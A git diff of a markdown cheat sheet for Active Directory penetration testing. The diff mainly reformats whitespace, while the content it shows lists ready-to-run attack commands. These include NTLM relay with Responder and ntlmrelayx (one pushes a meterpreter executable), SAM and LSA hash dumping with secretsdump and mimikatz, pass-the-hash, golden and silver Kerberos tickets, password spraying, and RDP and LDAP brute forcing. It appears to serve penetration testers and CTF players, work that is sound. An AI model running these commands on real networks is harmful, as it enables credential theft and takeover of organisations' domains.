@@ -10,21 +10,22 @@ This document provides a comprehensive guide to penetration testing within Activ
 ![](../ADbanner.png)
 
 ## Table of Contents
+
 - [Common Ports in AD](#common-ports-in-ad)
 - [NMap](#nmap)
 - [Metasploit](#metasploit)
-    - [Token Impersonation](#token-impersonation)
-- [Responder](#responder) 
-    - [LMNR Poisoning](#lmnr-poisoning)
-    - [SMB Relay](#smb-relay)
-    - [Responder Attacks](#responder-attacks)
+  - [Token Impersonation](#token-impersonation)
+- [Responder](#responder)
+  - [LMNR Poisoning](#lmnr-poisoning)
+  - [SMB Relay](#smb-relay)
+  - [Responder Attacks](#responder-attacks)
 - [enum4linux](#enum4linux)
 - [smb-map](#smbmap)
 - [smbclient](#smbclient)
 - [Impacket](#impacket)
-    - [secretdump](#secretdump)
-    - [GetUserSPN](#getuserspn)
-    - [ntlmrelayx IPV6 mitm6 Attack](#ntlmrelayx)
+  - [secretdump](#secretdump)
+  - [GetUserSPN](#getuserspn)
+  - [ntlmrelayx IPV6 mitm6 Attack](#ntlmrelayx)
 - [Kerbrute](#kerbrute)
 - [KrbRelayUp](#krbrelayup)
 - [ASREPRoast.py](#asreproastpy)
@@ -50,7 +51,9 @@ This document provides a comprehensive guide to penetration testing within Activ
 - [External Links](#external-links)
 
 # Common Ports in AD
+
 Active Directory Ports, Services, Vulnerabilities, and Tools
+
 - **Port 53 (DNS)**
   - Vulnerabilities: DNS Cache Poisoning, DNS Amplification
   - Tools: `nslookup`, `dig`, `dnsenum`, `Fierce`, `dnsrecon`, `dnstracer`
@@ -85,9 +88,8 @@ Active Directory Ports, Services, Vulnerabilities, and Tools
   - Vulnerabilities: BlueKeep, Weak Encryption, RDP Hijacking, Credential Forwarding
   - Tools: [ncrack](#ncrack), [xfreerdp](#xfreerdp), [Metasploit](#metasploit), [NetExec (CrackMapExec)](#netexec), [rdpscan](#rdpscan)
 
-
-
 ## NMap
+
 ```bash
 nmap -p 53,88,135,139,389,445,464,593,636,3268,3269,3389,5985,9389,49152-65535 <target> # Basic AD Port Scan
 nmap -p 53,88,135,139,389,445,464,593,636,3268,3269,3389,5985,9389,49152-65535 --script smb-enum-shares,smb-enum-users,ldap-rootdse,ldap-search,krb5-enum-users,smb-os-discovery,smb-vuln-ms17-010,smb-enum-domains,smb-enum-sessions,smb-enum-processes,smb2-security-mode,smb2-capabilities,smb-system-info,msrpc-enum,smb-brute,rdp-enum-encryption,rdp-vuln-ms12-020,rdp-ntlm-info,ssl-cert,ssl-enum-ciphers,smb-protocols,ms-sql-info,smb-vuln-regsvc-dos <target> # All Scripts for All AD Ports
@@ -110,6 +112,7 @@ nmap --script smb-brute -p 445 <target> # SMB Brute Force
 ```
 
 ## Metasploit
+
 ```bash
 # DNS (Port 53)
 - `auxiliary/gather/enum_dns`  # Enumerate DNS information
@@ -181,63 +184,69 @@ nmap --script smb-brute -p 445 <target> # SMB Brute Force
 Connect with metasploit psexec `exploit/windows/smb/psexec` using `windows/x64/meterpreter/reverse_tcp` payload.
 
 ```bash
-meterpreter> load incognito 
+meterpreter> load incognito
 meterpreter> list_tokens -u # listing tokens
 meterpreter> impersonate_token USERNAME\\Administrator
 meterpreter> shell #now you can use shell as USERNAME\\Administrator
 meterpreter> rev2self # to reverse impersonationation process, not important command
 ```
 
-
 ## Responder
+
 - ### LMNR Poisoning
-    Responder `responder -I eth0 -rdwv`
+  Responder `responder -I eth0 -rdwv`
 - ### SMB Relay
-    `nmap --script=smb2-security-mode.sse -p445`
+  `nmap --script=smb2-security-mode.sse -p445`
 - ### Responder Attacks
-    * http off smb off in responder.conf
-    - Attack 1
-        ```bash
-        responder -I eth0 -rdwv
-        ntlmrelayx.py -tf targets.txt -smb2support
-        ```
-    - Attack 2
-        ```bash
-        responder -I eth0 -rdwv
-        ntlmrelayx.py -tf targets.txt -smb2support -i # It will show SMB shell opned on port {PORT}
-        nc 127.0.0.1 {PORT}
-        ```
+  - http off smb off in responder.conf
+  * Attack 1
+    ```bash
+    responder -I eth0 -rdwv
+    ntlmrelayx.py -tf targets.txt -smb2support
+    ```
+  * Attack 2
+    `bash
+    responder -I eth0 -rdwv
+    ntlmrelayx.py -tf targets.txt -smb2support -i # It will show SMB shell opned on port {PORT}
+    nc 127.0.0.1 {PORT}
+    `
     SHELL command `shares` to get shares name and `use SHARENAME$` to get access.
-    - Attack 3
-        ```bash
-        responder -I eth0 -rdwv
-        ntlmrelayx.py -tf targets.txt -smb2support -e meterpreterShell.exe
-        ```
-    - Attack 4
-        ```bash
-        responder -I eth0 -rdwv
-        ntlmrelayx.py -tf targets.txt -smb2support -c "whoami"
-        ```
-        
+  * Attack 3
+    ```bash
+    responder -I eth0 -rdwv
+    ntlmrelayx.py -tf targets.txt -smb2support -e meterpreterShell.exe
+    ```
+  * Attack 4
+    ```bash
+    responder -I eth0 -rdwv
+    ntlmrelayx.py -tf targets.txt -smb2support -c "whoami"
+    ```
+
 ## enum4linux
+
 ```bash
 enum4linux -a -u "" -p "" <DC IP>  # Enumerate Users and Shares with blank user pass
 enum4linux -a -u "guest" -p "" <DC IP> # Enumerate Users and Shares with Guest Access
 enum4linux -G <DC IP>  # Retrieve Group Memberships
 enum4linux -P <DC IP>  # Retrieve Password Policies
 ```
+
 ## smbmap
+
 ```bash
 smbmap -u "" -p "" -P 445 -H <DC IP> # Enumerate SMB Shares with blank user pass
 smbmap -u "guest" -p "" -P 445 -H <DC IP> # Enumerate SMB Shares with Guest Access
 smbmap -u "guest" -p "" -P 445 -H <DC IP> -R # List Permissions on Shares
 smbmap -u "guest" -p "" -P 445 -H <DC IP> -w /path/to/local/file -d /remote/share/directory   # Upload a File to a Writable Share
 ```
+
 Check: [NetExec smb commands](#netExec-smb-commands)
+
 ## smbclient
+
 ```bash
 smbclient -U '%' -L //<DC IP>  # Enumerate SMB Shares with blank user pass
-smbclient -U 'guest%' -L //<DC IP>   # Enumerate SMB Shares with Guest Access 
+smbclient -U 'guest%' -L //<DC IP>   # Enumerate SMB Shares with Guest Access
 smbclient -L \\\\10.10.10.101\\   # Check if Anonymous Access is Enabled
 smbclient -L \\\\10.10.10.101\\username  # Login as a Specific User
 smb: > mget *   # Download All Files from a Share
@@ -245,26 +254,30 @@ smbclient -L \\\\10.10.10.101\\ -m SMB2   # Check SMB Signing
 smbclient -U 'admin%' -L //<DC IP>/C$   # Enumerate Access to Admin Shares
 smbclient //10.8.0.2/Users -U guest    # Login as guest
 ```
+
 Check: [NetExec smb commands](#netExec-smb-commands)
 
 ## Impacket
+
 - ### secretdump
-    - `secretsdump.py domain/user:password@192.168.0.101  #dump hash`
-    - Hashdump
-       ```bash 
-       reg save HKLM\SAM C:\Users\<YourUser>\Desktop\SAM.hiv
-       reg save HKLM\SYSTEM C:\Users\<YourUser>\Desktop\SYSTEM.hiv
-       secretsdump.py -sam SAM.hiv -system SYSTEM.hiv LOCAL
-        ```
+  - `secretsdump.py domain/user:password@192.168.0.101  #dump hash`
+  - Hashdump
+    ```bash
+    reg save HKLM\SAM C:\Users\<YourUser>\Desktop\SAM.hiv
+    reg save HKLM\SYSTEM C:\Users\<YourUser>\Desktop\SYSTEM.hiv
+    secretsdump.py -sam SAM.hiv -system SYSTEM.hiv LOCAL
+    ```
 - ### GetUserSPN
-    - Get Login Token with `GetUserSPNs.py domain.tld/username:password -dc-ip 192.158.0.101 -request`
+  - Get Login Token with `GetUserSPNs.py domain.tld/username:password -dc-ip 192.158.0.101 -request`
 - ### ntlmrelayx
-    - IPV6 mitm6 Attack `ntlmrelayx.py -6 -t ldaps://192.168.111 -wh sub.domain.tld -l loots`
+  - IPV6 mitm6 Attack `ntlmrelayx.py -6 -t ldaps://192.168.111 -wh sub.domain.tld -l loots`
 
 ## Kerbrute
+
 Repo: https://github.com/ropnop/kerbrute
 
 Notes: https://www.hackingarticles.in/a-detailed-guide-on-kerbrute/
+
 ```bash
 kerbrute userenum -t 1000 /opt/wordlist/SecLists/Usernames/xato-net-10-million-usernames.txt --dc 192.168.1.19 -d domain.tld #userenum
 kerbrute passwordspray -t 250 --dc 192.168.1.19 -d domain.tld users.txt Password@1 #user bruteforce with known password
@@ -272,7 +285,9 @@ kerbrute bruteuser -t 250 --dc 192.168.1.19 -d domain.tld password.txt admin #pa
 ```
 
 ## KrbRelayUp
-https://github.com/Dec0ne/KrbRelayUp 
+
+https://github.com/Dec0ne/KrbRelayUp
+
 ```bash
 .\KrbRelayUp.exe  # Run KrbRelayUp without parameters (default attack mode)
 .\KrbRelayUp.exe -u <username> -d <domain> -p <password>  # Specify credentials for relay attack
@@ -281,7 +296,9 @@ https://github.com/Dec0ne/KrbRelayUp
 ```
 
 ## ASREPRoast.py
+
 https://github.com/Hackndo/ASREPRoast
+
 ```bash
 python3 ASREPRoast.py -d <domain> -u <username>  # Request AS-REP for a specific user
 python3 ASREPRoast.py -d <domain> -u <username> -p <password>  # Use specific credentials to request AS-REP
@@ -290,20 +307,26 @@ python3 ASREPRoast.py -d <domain> --hashcat-format  # Output AS-REP hashes in Ha
 ```
 
 ## Hashcat
+
 ```bash
 hashcat -m 5600 hash.txt rockyout.txt -O # ntlm hash crack
 hashcat -m 1000 hash.txt rockyout.txt -O # sam hash crack
 hashcat -m13100 hash.txt rockyout.txt -o #login token crack
 ```
+
 ## johntheripper
+
 John The Ripper Jumbo version
+
 ```bash
 john --format=netntlm hash.txt --wordlist=rockyou.txt # ntlm crack
 john --format=NT hash.txt --wordlist=rockyou.txt # sam hash crack
 ```
 
 ## Hydra
+
 `-l` for single username, `-L` for username wordlist, `-p` for single password, `-P` for password wordlist
+
 ```bash
 hydra -L <user_list.txt> -P <password_list.txt> <target_IP> rdp   # RDP Bruteforce
 hydra -L <user_list.txt> -P <password_list.txt> <target_IP> ldap # LDAP bruteforce
@@ -315,6 +338,7 @@ hydra -l <username> -P <password_list.txt> <target_IP> http-form-post "/login.ph
 ```
 
 ## ldapsearch
+
 ```bash
 ldapsearch -x -h <host> -b "<base_dn>" "<search_filter>"  # Basic search in LDAP directory
 ldapsearch -x -h <host> -b "<base_dn>" "<search_filter>" <attribute1> <attribute2>  # Search with specific attributes
@@ -327,9 +351,11 @@ ldapsearch -x -h <host> -b "<base_dn>" -z <number_of_results> "<search_filter>" 
 ldapsearch -x -h <host> -b "<base_dn>" "<search_filter>" > results.txt  # Save search results to a file
 ldapsearch -x -h <host> -b "<base_dn>" "<search_filter>" -LLL  # Display results in LDIF format (no comments)
 ```
+
 ## ldapdomaindump
 
-https://github.com/dirkjanm/ldapdomaindump  # pip install ldap3 dnspython 
+https://github.com/dirkjanm/ldapdomaindump # pip install ldap3 dnspython
+
 ```bash
 ldapdomaindump -u <domain>\<username> -p <password> <target_ip>  # Perform a full LDAP domain dump with credentials
 ldapdomaindump -u <domain>\<username> -p <password> -o <output_directory> <target_ip>  # Specify output directory for dumped files
@@ -337,6 +363,7 @@ ldapdomaindump --hashes <LMHASH>:<NTHASH> <target_ip>  # Perform a dump using NT
 ldapdomaindump --no-json --no-grep --no-html <target_ip>  # Disable output in JSON, grepable, and HTML formats (output only raw dump)
 ldapdomaindump -u <domain>\<username> -p <password> -d <target_domain> <target_ip>  # Dump information from a specific domain
 ```
+
 ## PSEXEC
 
 - use exploit `exploit/windows/smb/psexec` on metasploit
@@ -348,7 +375,6 @@ Command to dump hash after shell in metasploit `hashdump`, or could be used any 
 
 - `psexec.py username:@192.168.0.111 -hashes fullhashfirstpart:fullhashanotherpart #Login with dump`
 
-
 ## NetExec
 
 New version of Crackmapexec. Old version: https://github.com/byt3bl33d3r/CrackMapExec
@@ -356,14 +382,18 @@ New version of Crackmapexec. Old version: https://github.com/byt3bl33d3r/CrackMa
 Repo: https://github.com/Pennyw0rth/NetExec
 
 Old Cheetsheet: https://cheatsheet.haax.fr/windows-systems/exploitation/crackmapexec/
+
 ### Basic Commands
+
 ```bash
 # in case of crackmapexec command is cme and for netexec it is nxc. Arguments are same.
 nxc smb 10.10.3.0/24 -u username -D Domain.tld -p password # Find login with password
 nxc smb 10.10.3.0/24 -u username -H hashdumpedhashlastpart --local # Find login with hash
 nxc smb 10.10.3.0/24 -u "FirestName LastName" -H hashdumpedhashlastpart --local-auth # Find login with hash
 ```
+
 ### NetExec smb commands
+
 ```bash
 nxc smb 10.10.11.35 -u Guest -p '' # To check guest user is allowed or not in smb
 nxc smb 10.10.11.35 -u Guest -p '' --rid-brute > c.txt    # smb user enumeration as guest user, To sort usernames cat c.txt | grep SidTypeUser | cut -d '\' -f 2 | awk '{print $1}' > usernames.txt
@@ -412,6 +442,7 @@ Repo: https://github.com/GhostPack/Rubeus
 - **S4U**: `Rubeus.exe s4u /user:USERNAME /rc4:HASH /impersonateuser:IMPERSONATE_USER /msdsspn:SPN`
 
 ## evil-winrm
+
 Repo: [https://github.com/Hackplayers/evil-winrm](https://github.com/Hackplayers/evil-winrm)
 
 ```bash
@@ -438,8 +469,10 @@ evil-winrm -i domain.target -u Administrator -r DOMAIN.LOCAL -k
 evil-winrm -i domain.target -u Administrator -H 0e0363213e37b94221497260b0bcb4fc -c C:\Users\Administrator\Desktop
 ```
 
-## ncrack 
+## ncrack
+
 RDP Brute Force Tool. Alternative: [hydra](#hydra)
+
 ```bash
 ncrack -p 3389 <target_ip>  # Brute force RDP login on the default port
 ncrack -p 3389 --user <username> -P <password_file> <target_ip>  # Brute force RDP login with a password list
@@ -448,8 +481,10 @@ ncrack -p 3389 --user <username> --pass <password> <target_ip>  # Brute force RD
 ncrack -p 3389 --delay 5ms --user <username_file> --pass <password_file> <target_ip>  # Add delay between connection attempts
 ```
 
-## rdpscan 
-RDP Vulnerability Scanner https://github.com/robertdavidgraham/rdpscan  # Clone the rdpscan repository
+## rdpscan
+
+RDP Vulnerability Scanner https://github.com/robertdavidgraham/rdpscan # Clone the rdpscan repository
+
 ```bash
 ./rdpscan <target_ip>  # Scan for BlueKeep (CVE-2019-0708) vulnerability
 ./rdpscan --file <ip_list.txt>  # Scan multiple IP addresses from a file for BlueKeep
@@ -458,7 +493,9 @@ RDP Vulnerability Scanner https://github.com/robertdavidgraham/rdpscan  # Clone 
 ```
 
 ## xfreerdp
+
 Alternative: Remmina GUI Tool
+
 ```bash
 xfreerdp /u:<username> /p:<password> /v:<target_ip>  # Connect to an RDP server with username and password
 xfreerdp /u:<username> /p:<password> /v:<target_ip>:<port>  # Connect to an RDP server on a specific port
@@ -467,7 +504,8 @@ xfreerdp /u:<username> /dynamic-resolution /multimon /v:<target_ip>  # Enable mu
 ```
 
 ## PowerSploit
-https://github.com/PowerShellMafia/PowerSploit  # Clone the PowerSploit repository in target system
+
+https://github.com/PowerShellMafia/PowerSploit # Clone the PowerSploit repository in target system
 
 ```powershell
 Import-Module ./Recon/PowerView.ps1  # Import PowerView module for Active Directory enumeration
@@ -498,7 +536,7 @@ https://github.com/PowerShellMafia/PowerSploit
 https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1
 
 ```powershell
-powershell -ep bypass 
+powershell -ep bypass
 ..\PowerView.ps1
 ```
 
@@ -524,24 +562,23 @@ Repo: https://github.com/ParrotSec/mimikatz
 Wiki: https://github.com/gentilkiwi/mimikatz/wiki
 
 - Dump Credentials
-    - **Dump SAM Hashes**: `mimikatz.exe "privilege::debug" "lsadump::sam"`
-    - **Dump LSA Secrets**: `mimikatz.exe "privilege::debug" "lsadump::secrets"`
-    - **Dump DCSync**: `mimikatz.exe "privilege::debug" "lsadump::dcsync /user:USERNAME"`
+  - **Dump SAM Hashes**: `mimikatz.exe "privilege::debug" "lsadump::sam"`
+  - **Dump LSA Secrets**: `mimikatz.exe "privilege::debug" "lsadump::secrets"`
+  - **Dump DCSync**: `mimikatz.exe "privilege::debug" "lsadump::dcsync /user:USERNAME"`
 - Pass-the-Hash
-    - **Pass-the-Hash**: `mimikatz.exe "privilege::debug" "sekurlsa::pth /user:USERNAME /domain:DOMAIN /ntlm:HASH"`
+  - **Pass-the-Hash**: `mimikatz.exe "privilege::debug" "sekurlsa::pth /user:USERNAME /domain:DOMAIN /ntlm:HASH"`
 - Kerberos
-    - **Purge Tickets**: `mimikatz.exe "kerberos::purge"`
-    - **List Tickets**: `mimikatz.exe "kerberos::list"`
-    - **Pass-the-Ticket**: `mimikatz.exe "kerberos::ptt TICKET.kirbi"`
+  - **Purge Tickets**: `mimikatz.exe "kerberos::purge"`
+  - **List Tickets**: `mimikatz.exe "kerberos::list"`
+  - **Pass-the-Ticket**: `mimikatz.exe "kerberos::ptt TICKET.kirbi"`
 - Overpass-the-Hash
-    - **Overpass-the-Hash**: `mimikatz.exe "sekurlsa::pth /user:USERNAME /domain:DOMAIN /rc4:HASH"`
+  - **Overpass-the-Hash**: `mimikatz.exe "sekurlsa::pth /user:USERNAME /domain:DOMAIN /rc4:HASH"`
 - Golden Ticket
-    - **Create Golden Ticket**: `mimikatz.exe "kerberos::golden /user:USERNAME /domain:DOMAIN /sid:SID /krbtgt:HASH /id:500"`
+  - **Create Golden Ticket**: `mimikatz.exe "kerberos::golden /user:USERNAME /domain:DOMAIN /sid:SID /krbtgt:HASH /id:500"`
 - Silver Ticket
-    - **Create Silver Ticket**: `mimikatz.exe "kerberos::golden /domain:DOMAIN /sid:SID /target:SERVICE /rc4:HASH /user:USERNAME /service:SERVICE /id:500"`
+  - **Create Silver Ticket**: `mimikatz.exe "kerberos::golden /domain:DOMAIN /sid:SID /target:SERVICE /rc4:HASH /user:USERNAME /service:SERVICE /id:500"`
 - Mimikatz Offline
-    - **Read minidump**: `mimikatz.exe "sekurlsa::minidump MINIDUMP.dmp" "sekurlsa::logonPasswords"`
-
+  - **Read minidump**: `mimikatz.exe "sekurlsa::minidump MINIDUMP.dmp" "sekurlsa::logonPasswords"`
 
 ## BloodHound
 
@@ -559,7 +596,7 @@ bloodhound #bloodhound start in new terminal tab
 Sharphound Data Collection for bloodhound https://github.com/BloodHoundAD/SharpHound3
 
 ```Powershell
-powershell -ep bypass 
+powershell -ep bypass
 ..\SharpHound.ps1
 Invoke-BloodHound -CollectionMethod All -Domain domain.tld -ZipFileName output.zip
 ```
@@ -567,25 +604,28 @@ Invoke-BloodHound -CollectionMethod All -Domain domain.tld -ZipFileName output.z
 Upload the `output.zip` file in BloodHound and then goto `Queries` and select `Queries`.
 
 ## BloodyAD and autobloody
+
 ```bash
 autobloody -u john.doe -p 'Password123!' --host 192.168.10.2 -dp 'neo4jP@ss' -ds 'JOHN.DOE@BLOODY.LOCAL' -dt 'BLOODY.LOCAL'
 bloodyAD --host 172.16.1.15 -d bloody.local -u jane.doe -p :70016778cb0524c799ac25b439bd6a31 set password john.doe 'Password123!'
 ```
 
 ## ADExplorer
-- https://docs.microsoft.com/en-us/sysinternals/downloads/adexplorer  # Download link for ADExplorer
+
+- https://docs.microsoft.com/en-us/sysinternals/downloads/adexplorer # Download link for ADExplorer
 - GUI tool could be used after gaining access with rdp.
-- Use the GUI to navigate through the Active Directory tree, Right-click to view properties of an object, Use the search bar to find specific objects. 
+- Use the GUI to navigate through the Active Directory tree, Right-click to view properties of an object, Use the search bar to find specific objects.
 - Searching Active Directory, Use the search functionality within the GUI to find specific users or groups.
 - Export the current view to a file `File -> Export -> Export Current View`. Export selected objects to CSV or other formats
 - Basic Usage by command
-    ```powershell
-    ADExplorer.exe  # Launch the ADExplorer GUI
-    ADExplorer.exe /path:<ldap_path>  # Open a specific LDAP path (e.g., LDAP://DC=example,DC=com)
-    ADExplorer.exe /readonly  # Start ADExplorer in read-only mode
-    ```
+  ```powershell
+  ADExplorer.exe  # Launch the ADExplorer GUI
+  ADExplorer.exe /path:<ldap_path>  # Open a specific LDAP path (e.g., LDAP://DC=example,DC=com)
+  ADExplorer.exe /readonly  # Start ADExplorer in read-only mode
+  ```
 
 # External Links
+
 1. [TryHackMe AttraktiveDirectory Writeup](https://github.com/ZishanAdThandar/WriteUps/blob/main/CTF/tryhackme.com/attacktivedirectory.md)
 2. [Active Directory Exploitation Cheat Sheet by Nikos Katsiopis](https://github.com/S1ckB0y1337/Active-Directory-Exploitation-Cheat-Sheet)
 3. [Attacking Active Directory: 0 to 0.9 By Eloy Pérez González](https://zer1t0.gitlab.io/posts/attacking_ad/)
@@ -594,4 +634,3 @@ bloodyAD --host 172.16.1.15 -d bloody.local -u jane.doe -p :70016778cb0524c799ac
 6. CherryTree [https://github.com/0xDigimon/PenetrationTesting_Notes-?tab=readme-ov-file](https://github.com/0xDigimon/PenetrationTesting_Notes-?tab=readme-ov-file)
 7. [https://www.thehacker.recipes/](https://www.thehacker.recipes/)
 8. [https://swisskyrepo.github.io/InternalAllTheThings/active-directory/ad-adds-enumerate/](https://swisskyrepo.github.io/InternalAllTheThings/active-directory/ad-adds-enumerate/)
-
